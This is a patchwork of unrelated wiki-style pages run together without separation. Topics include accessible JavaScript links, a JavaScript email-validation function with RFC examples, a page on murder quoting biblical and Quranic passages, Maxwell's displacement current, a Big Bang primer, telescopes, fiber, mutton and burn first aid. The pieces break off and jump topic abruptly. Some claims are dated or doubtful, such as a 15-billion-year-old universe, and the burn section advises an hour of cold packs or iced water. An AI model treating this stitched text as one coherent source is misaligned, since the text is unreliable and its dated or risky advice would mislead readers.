Users with JavaScript enabled will be provided with the JavaScript-embellished version of content (perhaps using DHTML), whereas those without will be redirected to a XHTML page that provides it statically. This is more accessible than having an &lt;a&gt; element lacking a normal href attribute value. First, it uses [[w:XHTML|proper language semantics]]. Second, it provides access to your content for users without JavaScript. Third, it detects whether the function execution succeeded and redirects JS-enabled readers too in case of a failure.

The onclick expression evaluates to a Boolean value. If the function succeeds to perform the desired effect and returns true, the onclick will return a failure and hyperlink not execute. When the function fails for whatever reason, the false, null or undefined value will evaluate to true and not prevent the link from being executed. Alternatively, if you do not wish to provide a static equivalent, you may embed the onclick attribute within an element with less demanding semantics:

 &amp;lt;strong onclick=&quot;resumeFancyVersion()&quot;&amp;gt;See my résumé!&amp;lt;/strong&amp;gt;

Thus no user agent will be confused upon reading a reduced &lt;a&gt; element.

== Email validation ==

Many people use Javascript functions to immediately catch the most common sorts of errors in form entry.
For example, some web forms ask people to enter the same thing twice.
Other web forms ask people to enter an email address.
Then they do a quick check to see if what was entered looks at least vaguely like an email address:
&lt;pre&gt;
function isValidEmail(str) {
  // These comments use the following terms from RFC2822:
  // local-part, domain, domain-literal and dot-atom.
  // Does the address contain a local-part followed an @ followed by a domain?
  // Note the use of lastIndexOf to find the last @ in the address
  // since a valid email address may have a quoted @ in the local-part.
  // Does the domain name have at least two parts, i.e. at least one dot,
  // after the @? If not, is it a domain-literal?
  // This will accept some invalid email addresses
  // BUT it doesn't reject valid ones. 
  var atSym = str.lastIndexOf(&quot;@&quot;);
  if (atSym &lt; 1) { return false; } // no local-part
  if (atSym == str.length - 1) { return false; } // no domain
  if (atSym &gt; 64) { return false; } // there may only be 64 octets in the local-part
  if (str.length - atSym &gt; 255) { return false; } // there may only be 255 octets in the domain

  // Is the domain plausible?
  var lastDot = str.lastIndexOf(&quot;.&quot;);
  // Check if it is a dot-atom such as example.com
  if (lastDot &gt; atSym + 1 &amp;&amp; lastDot &lt; str.length - 1) { return true; }
  //  Check if could be a domain-literal.
  if (str.charAt(atSym + 1) == '[' &amp;&amp;  str.charAt(str.length - 1) == ']') { return true; }
  return false;
}
&lt;/pre&gt;
&lt;!--
Please feel free to improve on this code.
But don't fall into the trap of &quot;improving&quot; it so much that it incorrectly rejects valid addresses.

http://javascript.internet.com/forms/check-email.html

--&gt;

Unfortunately, some other &quot;email validation&quot; Javascript functions reject perfectly valid email addresses. For example, some [http://javascript.internet.com/forms/email-validation---basic.html incorrectly reject] valid addresses that include &quot;+&quot; signs.

The original email address syntax (RFC 821) did allow &quot;+&quot; signs. RFC 822, published in the same month (August 1982), also allowed them. The current version of the syntax is given in [http://www.faqs.org/rfcs/rfc2821.html RFC2821]/[http://www.faqs.org/rfcs/rfc2822.html RFC2822]. Section 3 of [http://www.faqs.org/rfcs/rfc3696.html RFC3696] gives useful examples of unusual valid email addresses.
&lt;!--
The relevant parts of RFC821:

    &lt;mailbox&gt; ::= &lt;local-part&gt; &quot;@&quot; &lt;domain&gt;
    &lt;local-part&gt; ::= &lt;dot-string&gt; | &lt;quoted-string&gt;
    &lt;dot-string&gt; ::= &lt;string&gt; | &lt;string&gt; &quot;.&quot; &lt;dot-string&gt;
    &lt;string&gt; ::= &lt;char&gt; | &lt;char&gt; &lt;string&gt;
    &lt;char&gt; ::= &lt;c&gt; | &quot;\&quot; &lt;x&gt;
    &lt;c&gt; ::= any one of the 128 ASCII characters, but not any
                      &lt;special&gt; or &lt;SP&gt;

If I'm reading this correctly,
&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;$&quot;, &quot;+&quot;, &quot;!&quot;, &quot;%&quot;, &quot;X&quot;, &quot;Y&quot;, &quot;Z&quot; are all treated the same, as &quot;&lt;c&gt;&quot;, ordinary (not special) valid characters in the &quot;local-part&quot; of an email address.

Some people apparently think &quot;+&quot; is not a valid character in the local-part of an email address.
Why?
--&gt;

After validation, many JavaScript programmers encode the email address
using &lt;code&gt;encodeURIComponent()&lt;/code&gt;
to work-around certain client-side languages that can't seem to handle plus signs properly.&lt;ref&gt;
Jan Wolter.

2011.
&lt;/ref&gt;&lt;ref&gt;
[https://bugs.php.net/bug.php?id=39078 PHP bug #39078: Plus sign in URL arg received as space].
&lt;/ref&gt;

The complexity of the quoting rules used for email addresses makes it impractical to test the local-part of an address or a domain literal completely. Given that there isn't necessarily a real mailbox corresponding to a valid local-part how much extra download time is worth spending on a complex validation script?

=== Examples valid according to RFC2822 ===
* &lt;code&gt;me@example.com&lt;/code&gt;
* &lt;code&gt;a.nonymous@example.com&lt;/code&gt;
* &lt;code&gt;name+tag@example.com&lt;/code&gt;
* &lt;code&gt;a.name+tag@example.com&lt;/code&gt;
* &lt;code&gt;me.example@com&lt;/code&gt;
* &lt;code&gt;&quot;spaces must be quoted&quot;@example.com&lt;/code&gt;
* &lt;code&gt;!#$%&amp;'*+-/=.?^_`{|}~@[1.0.0.127]&lt;/code&gt;
* &lt;code&gt;!#$%&amp;'*+-/=.?^_`{|}~@[IPv6:0123:4567:89AB:CDEF:0123:4567:89AB:CDEF]&lt;/code&gt;
* &lt;code&gt;me(this is a comment)@example.com&lt;/code&gt; &amp;#8211; comments are discouraged but not prohibited by RFC2822.

=== Examples invalid according to RFC2822s ===
{{wikipedia|email address}}
* &lt;code&gt;me@&lt;/code&gt;
* &lt;code&gt;@example.com&lt;/code&gt;
* &lt;code&gt;me.@example.com&lt;/code&gt;
* &lt;code&gt;.me@example.com&lt;/code&gt;
* &lt;code&gt;me@example..com&lt;/code&gt;
* &lt;code&gt;me\@example.com&lt;/code&gt;
* &lt;code&gt;spaces\ must\ be\ within\ quotes\ even\ when\ escaped@example.com&lt;/code&gt;
* &lt;code&gt;a\@mustbeinquotes@example.com&lt;/code&gt;

      <text xml:space="preserve">[[wikipedia:en:Murder|Murder]] is the intentional taking of the life of another person.  Killing an individual may not be considered for various reasons, such as self-defense.

==Legal view of murder==

Not all cases of illegal killing constitute murder. For example, unintentionally caused deaths due to [[wikipedia:en:recklessness|recklessness]] or [[wikipedia:en:negligence|negligence]] are treated in most countries as the lesser crime of [[wikipedia:en:involuntary manslaughter|involuntary manslaughter]] or criminally negligent homicide. Similarly, intentional killings without premeditation are sometimes charged as voluntary manslaughter rather than murder. In addition, some illegal killings have legal defenses such as [[wikipedia:en:insanity|insanity]] or [[wikipedia:en:diminished capacity|diminished capacity]]).

Some cases of premeditated, intentional killing have lawful excuse and thus are not legally murder. These include killing non-surrendered enemy combatants in time of war, killing a person who poses an immediate threat to the lives of oneself or others (i.e., in self-defense), executing a person in accordance with a sentence of death, and, in some countries, [[wikipedia:en:abortion|abortion]] under defined circumstances. Sometimes killings under extreme provocation or duress are legally excused as [[wikipedia:en:justifiable homicide|justifiable homicide]].

Most countries allow conditions that &quot;affect the balance of the mind&quot; to be regarded as mitigating circumstances against murder. This means that a person may be found guilty of &quot;manslaughter on the basis of diminished responsibility&quot; rather than murder, if it can be proved that they were suffering from a condition that affected their judgement at the time. [[wikipedia:en:Depression|Depression]], [[wikipedia:en:post-traumatic stress disorder|post-traumatic stress disorder]] and medication side-effects are examples of conditions that may be taken into account when assessing responsibility. A somewhat different defense is [[wikipedia:en:insanity|insanity]], which is almost exclusively used in cases of psychosis such as that caused by schizophrenia. Also, some countries, such as Canada, Italy, the United Kingdom and Australia, allow [[wikipedia:en:post-partum depression|post-partum depression]], or 'baby-blues', as a defense against murder of a child by a mother, provided that a child is less than a year old. See also [[wikipedia:en:crime of passion|crime of passion]].

==Christianity==

===Old Testament===

:''Do not commit murder.'' [[wikipedia:en:Deuteronomy|Deuteronomy]] 5:17 [http://bible.ort.org/books/pentd2.asp?ACTION=displaypage&amp;BOOK=5&amp;CHAPTER=5]
:''Do not commit murder.'' [[wikipedia:en:Exodus|Exodus]] 20:12 [http://bible.ort.org/books/pentd2.asp?ACTION=displaypage&amp;BOOK=2&amp;CHAPTER=20]

===New Testament===

:''...no murderer hath eternal life abiding in him.'' (1 John 3:15)
:''murderers... shall have their part in the lake which burneth with fire and brimstone: which is the second death.'' (Revelation 21:8)
:''Ye have heard that it was said by them of old time, Thou shalt not kill; and whosoever shall kill shall be in danger of the judgment.'' (Matthew 5:21)
:''Thou shalt not commit adultery, Thou shalt not kill'' (Romans 13:9)
:Listing sins: ''Envyings, murders, drunkenness, revellings'' (Galatians 5:21) 
:Listing sins: ''Neither repented they of their murders, nor of their sorceries, nor of their fornication, nor of their thefts.'' (Revelation 9:21)
:Listing sins: ''murderers, and whoremongers, and sorcerers, and idolaters, and all liars'' (Revelation 21:8)

===Abortion===

Many Christians, especially conservative Christians, oppose [[wikipedia:en:abortion|abortion]], [[wikipedia:en:capital punishment|capital punishment]] and [[wikipedia:euthanasia|euthanasia]] on the grounds that it ends a life and thus constitutes murder.

===Justified murder and execution===
There are many passages in the Bible that could be construed as justifying either murder or capital punishment.

:''Anyone arrogant enough to reject the verdict of the judge or of the priest who represents the LORD your God must be put to death.  Such evil must be purged from Israel.''  (Deuteronomy 17:12 NLT)
:''You should not let a sorceress live.''  (Exodus 22:17 NAB)
:''If a man lies with a male as with a woman, both of them shall be put to death for their abominable deed; they have forfeited their lives.''  (Leviticus 20:13 NAB)
:''A man or a woman who acts as a medium or fortuneteller shall be put to death by stoning; they have no one but themselves to blame for their death.''  (Leviticus 20:27 NAB)
:''Whoever strikes his father or mother shall be put to death.''  (Exodus 21:15 NAB)
:''If one curses his father or mother, his lamp will go out at the coming of darkness.''  (Proverbs 20:20 NAB)
:''But if this charge is true (that she wasn't a virgin on her wedding night), and evidence of the girls virginity is not found, they shall bring the girl to the entrance of her fathers house and there her townsman shall stone her to death, because she committed a crime against Israel by her unchasteness in her father's house.  Thus shall you purge the evil from your midst.''  (Deuteronomy  22:20-21 NAB)
:''If your own full brother, or your son or daughter, or your beloved wife, or you intimate friend, entices you secretly to serve other gods, whom you and your fathers have not known, gods of any other nations, near at hand or far away, from one end of the earth to the other: do not yield to him or listen to him, nor look with pity upon him, to spare or shield him, but kill him.  Your hand shall be the first raised to slay him; the rest of the people shall join in with you.  You shall stone him to death, because he sought to lead you astray from the Lord, your God, who brought you out of the land of Egypt, that place of slavery.  And all Israel, hearing of this, shall fear and never do such evil as this in your midst.''  (Deuteronomy 13:7-12 NAB)
:''Suppose a man or woman among you, in one of your towns that the LORD your God is giving you, has done evil in the sight of the LORD your God and has violated the covenant by serving other gods or by worshiping the sun, the moon, or any of the forces of heaven, which I have strictly forbidden.  When you hear about it, investigate the matter thoroughly. If it is true that this detestable thing has been done in Israel, then that man or woman must be taken to the gates of the town and stoned to death.''  (Deuteronomy 17:2-5 NLT)
:''One day a man who had an Israelite mother and an Egyptian father got into a fight with one of the Israelite men.  During the fight, this son of an Israelite woman blasphemed the LORD's name.  So the man was brought to Moses for judgment.  His mother's name was Shelomith. She was the daughter of Dibri of the tribe of Dan.  They put the man in custody until the LORD's will in the matter should become clear.  Then the LORD said to Moses, &quot;Take the blasphemer outside the camp, and tell all those who heard him to lay their hands on his head.  Then let the entire community stone him to death.  Say to the people of Israel: Those who blaspheme God will suffer the consequences of their guilt and be punished.  Anyone who blasphemes the LORD's name must be stoned to death by the whole community of Israel.  Any Israelite or foreigner among you who blasphemes the LORD's name will surely die.''  (Leviticus 24:10-16 NLT)
:''Suppose there are prophets among you, or those who have dreams about the future, and they promise you signs or miracles,  and the predicted signs or miracles take place.  If the prophets then say, 'Come, let us worship the gods of foreign nations,' do not listen to them.  The LORD your God is testing you to see if you love him with all your heart and soul.  Serve only the LORD your God and fear him alone.  Obey his commands, listen to his voice, and cling to him.  The false prophets or dreamers who try to lead you astray must be put to death, for they encourage rebellion against the LORD your God, who brought you out of slavery in the land of Egypt.  Since they try to keep you from following the LORD your God, you must execute them to remove the evil from among you.''  (Deuteronomy 13:1-5 NLT)
:''But any prophet who claims to give a message from another god or who falsely claims to speak for me must die.'  You may wonder, 'How will we know whether the prophecy is from the LORD or not?'  If the prophet predicts something in the LORD's name and it does not happen, the LORD did not give the message.  That prophet has spoken on his own and need not be feared.''  (Deuteronomy 18:20-22 NLT)
:''So God let them go ahead and do whatever shameful things their hearts desired.  As a result, they did vile and degrading things with each other's bodies.  Instead of believing what they knew was the truth about God, they deliberately chose to believe lies.  So they worshiped the things God made but not the Creator himself, who is to be praised forever.  Amen.  That is why God abandoned them to their shameful desires.  Even the women turned against the natural way to have sex and instead indulged in sex with each other.  And the men, instead of having normal sexual relationships with women, burned with lust for each other.  Men did shameful things with other men and, as a result, suffered within themselves the penalty they so richly deserved.  When they refused to acknowledge God, he abandoned them to their evil minds and let them do things that should never be done.  Their lives became full of every kind of wickedness, sin, greed, hate, envy, murder, fighting, deception, malicious behavior, and gossip.  They are backstabbers, haters of God, insolent, proud, and boastful.  They are forever inventing new ways of sinning and are disobedient to their parents.  They refuse to understand, break their promises, and are heartless and unforgiving.  They are fully aware of God's death penalty for those who do these things, yet they go right ahead and do them anyway.  And, worse yet, they encourage others to do them, too.''  (Romans 1:24-32 NLT)
:''For the LORD had said to Moses, 'Exempt the tribe of Levi from the census; do not include them when you count the rest of the Israelites.  You must put the Levites in charge of the Tabernacle of the Covenant, along with its furnishings and equipment.  They must carry the Tabernacle and its equipment as you travel, and they must care for it and camp around it.  Whenever the Tabernacle is moved, the Levites will take it down and set it up again.  Anyone else who goes too near the Tabernacle will be executed.''  (Numbers 1:48-51 NLT)
:''The LORD then gave these further instructions to Moses: 'Tell the people of Israel to keep my Sabbath day, for the Sabbath is a sign of the covenant between me and you forever.  It helps you to remember that I am the LORD, who makes you holy.  Yes, keep the Sabbath day, for it is holy.  Anyone who desecrates it must die; anyone who works on that day will be cut off from the community.  Work six days only, but the seventh day must be a day of total rest.  I repeat: Because the LORD considers it a holy day, anyone who works on the Sabbath must be put to death.''  (Exodus 31:12-15 NLT)
:''All who curse their father or mother must be put to death.  They are guilty of a capital offense.''  (Leviticus 20:9 NLT)
:''If a man commits adultery with another man's wife, both the man and the woman must be put to death.''  (Leviticus 20:10 NLT)
:''A priest's daughter who loses her honor by committing fornication and thereby dishonors her father also, shall be burned to death.''  (Leviticus 21:9 NAB)
:''If you find it (that a person in a town worships another god) and can prove that such a detestable act has occurred among you, you must attack that town and completely destroy all its inhabitants, as well as all the livestock.'' (Deuteronomy 13 NLT)
:''Whoever sacrifices to any god, except the Lord alone, shall be doomed.''  (Exodus 22:19 NAB)
:''They entered into a covenant to seek the Lord, the God of their fathers, with all their heart and soul; and everyone who would not seek the Lord, the God of Israel, was to be put to death, whether small or great, whether man or woman.''  (2 Chronicles 15:12-13 NAB)
:''If a man still prophesies, his parents, father and mother, shall say to him, &quot;You shall not live, because you have spoken a lie in the name of the Lord.&quot;  When he prophesies, his parents, father and mother, shall thrust him through.''  (Zechariah 13:3 NAB)

==Islam==

Most Muslim scholars believe that all murder is forbidden in Islam.  Some people claim, however that Islam is tolerant of murder, such as writer [[wikipedia:en:Robert Spencer|Robert Spencer]] [http://www.freerepublic.com/focus/news/818429/posts].

:''And slay not the soul which God has forbidden except for the just cause'' (Koran 17:33)
:''If anyone killed a person not in retaliation for murder or to spread mischief in the land, it would be as if he killed the whole of mankind. And if anyone saved a life, it would be as if he saved the whole of mankind'' (Surah Al-Maaida 5:32)
:''Fight for the sake of Allah those that fight against you, but do not attack them first. Allah does not love the aggressors.'' (Koran 2:190)
:''The Prophet Mohamad said to his army before going to a fight &quot;Depart in the name of Allah, and by his help. And kill not any old man nor young boy nor child, nor woman, But be good doers for Allah loves those who do good.'' (Hadeeth)

===Allah guiding human hands===

:''It is not us who slay them but Allah, in order that He might test the Believers by a gracious trial from Himself.'' (Koran 8:17; cp. Surah Al-Baqarah 2:190)
:''Allah &quot;will punish them by our hands'' (Koran 9:14).

===Martyrdom===

Some sects of Islam believe that those who kill or are killed by unbelievers will enter Paradise after death (Koran 9:111).


:''fight (non-Muslims) and let them find harshness in you'' (Koran 9:123).
:''So when you meet (in fight/war), strike off the heads of the disbelievers and wound many of them, then bind a bond firmly (take as captives). Thereafter, either for generosity or ransom (according to what benefits Islam) until the war lays down its burden...'' (Koran 47:4). 
:''slay or crucify or cut the hands and feet of those who wage a war against Allah and His messenger, that they be expelled from the land with disgrace'' (Koran 5:33).

==Buddhism==

One of the [[wikipedia:en:Five Precepts|Five Precepts]] is ''I undertake to abstain from harming living beings.'' [http://buddhism.about.com/od/ethics/a/IB5.htm].

== How Maxwell Fixed [[Modern Physics:Ampere's Law for Magnetism|Ampère's Law]] ==

When Maxwell was looking at Ampere's Law, he realised that changing electric fields acted like currents, but this was not present in its current form. So Maxwell added it, and the full version of Ampere's Law became:

:&lt;math&gt;\nabla \times \mathbf {B} = \mu_0 \mathbf {J} + \mu_0 \epsilon_0 \frac{\partial \mathbf{E}}{\partial t} &lt;/math&gt;

This realization came about due to the fact that previously Ampere's law was not compatible with the conservation of charge/continuity equation. Upon taking the divergence of Ampere's original equation, it is found that the divergence of the current is equal to zero, which is not in accordance with the conservation of charge.  This paradox was resolved through the introduction of the displacement current.

== Using The New Law ==

When we look at this in a vacuum and combine it to Faraday's Law of Induction:

:&lt;math&gt;\nabla \times \mathbf {B} = \mu_0 \epsilon_0 \frac{\partial \mathbf{E}}{\partial t} &lt;/math&gt;

:&lt;math&gt;\nabla \times \mathbf{E} = -\frac{\partial \mathbf{B}} {\partial t}&lt;/math&gt;

And then we solve this, we can see that it's a wave travelling with velocity c.

== Sketch Proof ==

:&lt;math&gt;\nabla \times \mathbf{E} = -\frac{\partial \mathbf{B}} {\partial t}&lt;/math&gt;

:&lt;math&gt;-\int (\nabla \times \mathbf{E}) dt = \mathbf{B} &lt;/math&gt;

Substituting this into Ampere's Law gives:

:&lt;math&gt;-\nabla \times \int (\nabla \times \mathbf{E}) dt = \mu_0 \epsilon_0 \frac{\partial \mathbf{E}}{\partial t} &lt;/math&gt;

:&lt;math&gt;\nabla \times (\nabla \times \mathbf{E}) = -\mu_0 \epsilon_0 \frac{\partial^2 \mathbf{E}}{\partial t^2} &lt;/math&gt;

We now use the following relation:

:&lt;math&gt; \nabla \times (\nabla \times \mathbf{A}) = \nabla(\nabla \cdot \mathbf{A}) - \nabla^2 \mathbf{A}&lt;/math&gt;

This gives us:

:&lt;math&gt; \nabla^2 \mathbf{E} = \mu_0 \epsilon_0 \frac{\partial^2 \mathbf{E}}{\partial t^2} &lt;/math&gt;

And similarly:

:&lt;math&gt; \nabla^2 \mathbf{B} = \mu_0 \epsilon_0 \frac{\partial^2 \mathbf{B}}{\partial t^2} &lt;/math&gt;

This should look familiar to you, it's a second derivative with respect to location, equal to a negative second derivative with respect to time. It's a sine function (really imaginary exponential, but it's satisfactory to use sine here). That moves at velocity
&lt;math&gt;c = \frac{1}{\sqrt{\mu_0 \epsilon_0}}&lt;/math&gt;.

And experimental values of these numbers gave results extremely close to the observed value of speed of light.

::''This velocity is so nearly that of light, that it seems we have strong reason to conclude that light itself (including radiant heat, and other radiations if any) is an electromagnetic disturbance in the form of waves propagated through the electromagnetic field according to electromagnetic laws.'' --Maxwell 1865

== How do we really know light is an electromagnetic wave? ==

Just the fact that the speed comes out correct and the fact that light has wave behaviors (interference and diffraction) is not enough -- after all, ''gravitational'' waves would also have these properties. Perhaps the most compelling evidence that light is an ''electromagnetic'' wave is that 
* The reflection of light from conductors and from dielectrics behaves as one expects from Maxwell's equations
* The polarization of light produced by reflection and scattering is as one expects from Maxwell
* High intensity lasers can cause air and other (dielectric) materials to &quot;break down&quot;. This looks like a tiny spark, just as one would expect if light is made of electric and magnetic fields, with the electric field causing dielectric breakdown.
* There is a continuum of radiation types, from radio waves, which we ''know'' are electromagnetic because we fabricate it (and capture their charges with antennas), to light, through microwaves, far infrared, near infrared, light (and beyond). These radiation types exhibit properties continuously and smoothly varying with their wavelength, without jumps.</text>

= Origin of the Universe =

Looking deep inside microscopic particles, physicists need to collide them with high kinetic energies. The
smaller parts of matter they want to observe, the higher energy they need. This is why they build more and more powerful
accelerators. However, the accelerators have natural limitations. Indeed, an accelerator cannot be bigger than the size of our planet.
And even if we manage to build a circular accelerator around the whole earth (along the equator, for example), it would not be able
to reach the energy of &lt;math&gt;\sim10^{17}&lt;/math&gt;MeV at which the grand unification of fundamental interactions takes place.

So, what are we to do? How can we test the theory of everything? Is it possible at all? Yes, it is! The astronomically high values, like
&lt;math&gt;\sim10^{17}&lt;/math&gt;MeV, should be looked for in the cosmos, of course. Our journey towards extremely small objects eventually leads us to
extremely large objects, like whole universe.

Equations of Einstein's theory of relativity can describe the evolution of the universe. Physicists solved these equations back in
time and found that the universe had its beginning. Approximately 15 billion years ago, it started from a zero size point that exploded
and rapidly expanded to the present tremendous scale. This latter point will ever not sufficiently stressed: Big Bang has been an '''Expansion of Space''', and not an expansion in space. At the first instants after the explosion, the matter was at such incredibly high
density and temperature that all particles had kinetic energies even higher than the unification energy &lt;math&gt;\sim10^{17}&lt;/math&gt;MeV. This means 
that at the very beginning there was only one single force and no difference among fundamental particles. Everything was unified and ''simple''.

You may ask ''So what? How can so distant past help us?''. In many ways! The development of the universe was governed by the
fundamental forces. If our theories about them are correct, we should be able to reproduce (with calculations) how that development
proceeded step by step. During the expansion, all the nuclei and atoms in the cosmos were created. The amounts of different nuclei
are not the same. Why? Their relative abundances were determined by the processes in the first moments after the explosion. Thus,
comparing what follows from the theories with the observed abundances of chemical elements, we can judge validity of our theories.

Nowadays, the most popular theory, describing the history of the universe, is the so-called ''Big-Bang'' model. The diagram given
in Fig. 15.11, shows the sequence of events which led to the creation of matter in its present form.

Nobody knows what was before the Big Bang and why it happened, but it is assumed that just after this enigmatic cataclysm, the universe
was so dense and hot that all four forces of nature (strong, electromagnetic, weak, and gravitational) were indistinguishable and
therefore gravity was governed by quantum laws, like the other three types of interactions. A complete theory of quantum gravity has not
been constructed yet, and this very first ''epoch'' of our history remains as enigmatic as the Big Bang itself.

The ideal ''democracy'' (equality) among the forces lasted only a small fraction of a second. By the time &lt;math&gt;t\sim 10^{-43}&lt;/math&gt; sec the universe cooled down to 
&lt;math&gt;\sim 10^{32}&lt;/math&gt;K and the gravity separated. The other three forces, however, remained unified into one universal
interaction mediated by an extremely heavy particle, the so-called &lt;math&gt;X&lt;/math&gt; boson, which could transform leptons into quarks and 
vice versa.


When at &lt;math&gt;t\sim 10^{-35}&lt;/math&gt; sec most of the &lt;math&gt;X&lt;/math&gt; bosons decayed, the 
quarks combined in trios and pairs to form nucleons, mesons, and other hadrons. The only symmetry which lasted up to
&lt;math&gt;\sim10^{-10}&lt;/math&gt;sec, was between the electromagnetic and weak forces mediated by the &lt;math&gt;Z&lt;/math&gt; and &lt;math&gt;W&lt;/math&gt; particles. 
From the moment when this last symmetry was broken (&lt;math&gt;\sim10^{-10}&lt;/math&gt;sec) until the universe 
was about one second old, neutrinos played the most significant role by mediating the neutron-proton transmutations and therefore fixing
their balance (neutron to proton ratio).

Already in a few seconds after the Big Bang nuclear reactions started to occur. The protons and neutrons combined very rapidly to
form deuterium and then helium. During the very first seconds there were too many very energetic photons around which destroyed these
nuclei immediately after their formation. Very soon, however, the continuing expansion of the universe changed the conditions in
favour of these newly born nuclei. The density decreased and the photons could not destroy them that fast anymore.

During a short period of cosmic history, between about 10 and 500 seconds, the entire universe behaved as a giant nuclear fusion
reactor burning hydrogen. This burning took place via a chain of nuclear reactions, which is called the ''&lt;math&gt;pp&lt;/math&gt;-chain'' because the 
first reaction in this sequence is the proton-proton collision leading to the formation of a deuteron. Nowadays, the same
&lt;math&gt;pp&lt;/math&gt;-chain is the main source of energy in our sun and other stars.

But how do we know that the scenario was like this? In other words, how can we check the Big-Bang theory? Is it possible to prove
something which happened 15 billion years ago and in such a short time? Yes, it is! The &lt;math&gt;pp&lt;/math&gt;-chain fusion, 

[[Image:Fhsst_atomnucl13.png|416px|]]

is the key for such a proof.

|-

|}

As soon as the nucleosynthesis started, the amount of deuterons, helium isotopes, and other light nuclei started to increase. This is
shown in Fig. 15.12 for &lt;math&gt;{}^2&lt;/math&gt;H and &lt;math&gt;{}^4&lt;/math&gt;He. The temperature and the density, however, continued to decrease. After a few minutes
the temperature dropped to such a level that the fusion practically stopped because the kinetic energy of the nuclei was not sufficient
to overcome the electric repulsion between nuclei anymore. Therefore the abundances of light elements in the cosmos were fixed (we call
them the ''primordial abundances''). Since then, they practically remain unchanged, like a photograph of the past events, and
astronomers can measure them. Comparing the measurements with the predictions of the theory, we can check whether our assumptions
about the first seconds of the universe are correct or not.

Astronomy and the physics of microworld come to the same point from different directions. The Big Bang theory is only one example of
their common interest. Another example is related to the mass of neutrino. When Pauli suggested this tiny particle to explain the
nuclear &lt;math&gt;\beta&lt;/math&gt;-decay, it was considered as massless, like the photon. However, the experiments conducted recently, indicate that
neutrinos may have small non-zero masses of just a few eV.

In the world of elementary particles, this is extremely small mass, but it makes a huge difference in the cosmos. The universe
continues to expand despite the fact that the gravitational forces pull everything back to each other. The estimates show, that the
visible mass of all galaxies is not sufficient to stop and reverse the expansion. The universe is filled with a tremendous number of
neutrinos. Even with few eV per neutrino, this amounts to a huge total mass of them, which is invisible but could reverse the expansion.

Thus, the cooperation of astronomers and particle physicists has led to significant advances in our understanding of the universe and its
evolution. The quest goes on. Albert Einstein once said &quot;The most incomprehensible thing about this Universe is that it is comprehensible.&quot;</text>

The word telescope originates from the Greek language (''τηλεσκόπιο''), and it means literally ''far-seeing''. It is an instrument that is intended to gather information, usually in the form of light or other energy, about a distant location that can not be perceived directly by the unaided eye. Telescopes let you magnify faint stars, and see finer detail. This allows you to, for example, distinguish one star as two stars that are very close (such as Mizar A and B).

Telescopes are used by astronomers to gather visual and other information the human eye alone cannot see. They do so by means of a large collector surface that then directs the incoming energy photons into a smaller focusing lens. This large surface also allows the resolution of fine details that are too close together for the human eye to discern. It was through his usage of the telescope that Galileo discovered that the celestial spheres weren't perfect, as had been thought. He could see sunspots, and the lunar &quot;seas&quot;.

Today, observational astronomy covers the entire range of the electromagnetic spectrum. Telescopes detecting other fundamental particles are also very common. Nonetheless, we shall start with our most familiar part in the field, the optical region in the spectrum.

Some difficulties with telescopes are '''chromatic aberration''' (different colors focused at different points) and '''spherical aberration''' (light isn't focused at a single point). Spherical aberration can occur when the reflecting mirror in a telescope isn't a true parabola.

'''Adaptive optics''' are used to compensate for atmospheric distortion which is caused by small changes in the refractive index of the atmosphere, which is responsible for the &quot;twinkling&quot; effect.

The Light Gathering Power of a telescope is measured by the area of the lens divided by the area of the eye.

Large telescopes are housed inside '''observatories'''. One of the most famous is the Lick Observatory on Mt. Hamilton, named after James Lick, a streetcar baron, who made donations to have the observatory built. When he died, he was buried beneath it.

'''Light pollution''' makes stargazing difficult. This is caused by fixtures (such as streetlamps) that allow light to go up into the atmosphere where it is reflected and creates a &quot;fog&quot; of light that makes viewing very dim distant objects difficult.

==The spectrum==
Our sense of sight is based upon particles of electro-magnetic energy that are emitted by objects and then collected by our eyes. These particles are vibrating quanta of energy that are known as ''photons''. Every photon oscillates at a particular frequency, and the range of all possible frequencies is called the ''spectrum''.

Human eyes are attuned to a particular frequency range of photons that lie within the visual portion of the spectrum. We can not directly view photons that vibrate at frequencies above or below this range, although measuring instruments have been constructed to measure these parts of the spectrum.

All the information we have about the planets in our solar system, and the stars and galaxies comes to us from photons that have traveled that great distance. It is almost exclusively by means of these photons that astronomers have been able to assemble our current knowledge of the universe beyond the Earth.

''(Some people are working on the [[Wikipedia: Laser Interferometer Gravitational-Wave Observatory| Laser Interferometer Gravitational-Wave Observatory]] and the [[Wikipedia: Virgo interferometer | Virgo interferometer ]] to try to detect gravity waves, composed of &quot;gravitons&quot;, that have traveled that great distance.)''

'''Fibers''' are long chains of [[Cookbook:Carbohydrates|carbohydrates]] that are undigestable to the human digestive tract. Consuming enough fiber in your diet is important, as it bulks up the stools and allows them to retain moisture better, resulting in easier &lt;s&gt;defecation&lt;/s&gt;. 

Some foods that have high amounts of fiber include [[Cookbook:Legumes|legumes or beans]], [[Cookbook:Artichoke|artichokes]], [[Cookbook:Apple|apples]], [[Cookbook:Banana|bananas]], [[Cookbook:Broccoli|broccoli]], and [[Cookbook:Carrot|carrots]].

'''Mutton''' can either mean the meat from an adult sheep (contrast with [[Cookbook:Lamb|lamb]]), or meat from a [[Cookbook:Goat|goat]]. Most English-speaking countries refer to sheep meat as mutton, whereas some [[Cookbook:Asian Cuisine|Asian]] and [[Cookbook:Caribbean cuisines|Caribbean]] use the term for goat.

Mutton from adult sheep is more flavoursome than lamb, but is fattier and tougher to cook. It would easier to cook the meat if it could be seasoned with ginger, which softens the meat and makes it cook faster. Ginger also removes the musky smell of the meat. Mutton is increasingly hard to find, as butchers and supermarkets move more towards easier cooking cuts of meat. Mutton is preferred over lamb for stews and long-simmered curries.

Mutton from goat (sometimes called ''chevon'') is much leaner than both lamb and mutton from sheep. It is a very flavoursome meat, well suited to spicy stews and curries. Being very lean, oil or fat often needs to be added to the meal, especially when pan-frying or barbecuing.

      <text xml:space="preserve">'''Burns''' should be immediately immersed in cold running water, or shower for large area.  Do not wait to remove clothes.  This should be maintained for at least 10-15 minutes.  

Continue for at least 1 hour with cold pack, partially insulated with clean fabric (cotton, thin toweling), or further immersion in iced water.  Blistered or open burn wounds should be cleaned and covered with non-adhesive gauze (preferably bactericidal) and cotton dressing.  DO NOT use butter, oils or any similar treatment which can trap heat and increase risk of infection.  Also do not use antiseptics that may aggravate sensitive skin.  

Consult a medical physician immediately for any large, deep, infected or otherwise serious burn.

Aloe vera extract, silverdene (Silver Sulfazdiazine), topical analgaesics and NSAID are commonly used medications.  Consult a doctor before use.

